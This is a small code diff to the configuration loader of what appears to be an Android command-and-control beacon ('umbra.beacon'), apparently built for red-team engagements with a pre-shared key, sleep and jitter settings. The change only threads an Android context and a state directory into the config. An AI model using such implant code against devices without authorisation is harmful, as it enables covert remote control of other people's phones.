@@ -7,7 +7,7 @@ package io.umbra.beacon
  * app/build.gradle), so one APK per engagement -- nothing is fetched at runtime.
  */
 object RemoteConfig {
-    fun load(): BeaconConfig? {
+    fun load(context: android.content.Context? = null): BeaconConfig? {
         val pskHex = BuildConfig.UMBRA_PSK_HEX
         if (pskHex.isBlank()) return null
         val psk = try {
@@ -31,6 +31,8 @@ object RemoteConfig {
             sleepSec = BuildConfig.UMBRA_SLEEP,
             jitterPercent = BuildConfig.UMBRA_JITTER,
             version = BuildConfig.VERSION_NAME,
+            androidContext = context,
+            stateDir = context?.filesDir?.absolutePath ?: "",
         )
     }
 }
